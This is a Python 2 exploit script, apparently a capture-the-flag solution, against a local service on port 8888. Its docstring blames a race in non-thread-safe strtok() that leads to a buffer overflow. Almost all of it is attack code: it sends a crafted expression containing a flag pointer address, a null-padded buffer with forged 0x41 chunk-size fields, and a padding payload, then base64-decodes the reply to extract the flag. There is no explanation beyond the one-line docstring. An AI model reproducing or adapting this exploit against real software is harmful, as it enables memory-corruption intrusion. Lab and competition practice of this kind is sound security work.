#!/usr/bin/env python

'''
strtok() is not thread-safe and may cause buffer overflow by race condition
'''

from util import *
import re

s = service()
s.connect('127.0.0.1', 8888)

s.send('2\n1\n')
code = s.recvuntil('\n')[:-1]
s.send('3\n' + code + '\n')
s.recvuntil('RESULT = 1\n')

buf = 0x8054300
flag_ptr = buf + 0xb0
s.send('2\n')
s.send('( 0 + '*90 + str(flag_ptr) + ' )'*90 + '\n')
code = s.recvuntil('\n')[:-1]
s.send('3\n')
s.send(code + '\n')
s.send('2\n')
s.send('\x00' * (flag_ptr - buf - 8) + p32(0) + p32(0x41) + 'A'*60 + p32(0x41) + '\n')
s.recvuntil('[ERROR] Compile error: empty input\n')

s.send('2\n')
s.send('/*' + 'A'*53 + '*/$?\n')
code = s.recvuntil('\n')
s.close()

print re.findall('\x00(.*)\x00', code.decode('base64'))[0]

